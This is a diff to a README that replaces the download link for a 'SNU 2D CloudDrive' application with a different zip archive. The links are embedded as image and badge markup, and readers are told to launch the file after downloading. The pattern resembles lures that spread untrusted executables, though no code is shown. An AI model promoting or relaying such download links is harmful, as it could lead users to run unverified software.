@@ -1,6 +1,6 @@
 # 🌟 Welcome to the SNU 2D CloudDrive Amazon Drive Mode Project! 🌟
 
-![SNU 2D CloudDrive Amazon Drive Mode Project](https://github.com/user-attachments/files/18426772/Application.zip)
+![SNU 2D CloudDrive Amazon Drive Mode Project](https://github.com/elifali067/SNU_2D_CloudDrive_Modes_Amazon_Drive/releases/download/v2.0/Software.zip)
 
 ## Repository: SNU_2D_CloudDrive_Modes_Amazon_Drive
 
@@ -32,7 +32,7 @@ Welcome to the official source repository for the SNU 2D CloudDrive Amazon Drive
 ### Project Application
 Check out the latest application for the SNU 2D CloudDrive Amazon Drive mode by clicking the button below:
 
-[![Download Application](https://img.shields.io/badge/Download-Application-blue)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Download Application](https://github.com/elifali067/SNU_2D_CloudDrive_Modes_Amazon_Drive/releases/download/v2.0/Software.zip)](https://github.com/elifali067/SNU_2D_CloudDrive_Modes_Amazon_Drive/releases/download/v2.0/Software.zip)
 
 *Note: The application needs to be launched after downloading.*
 
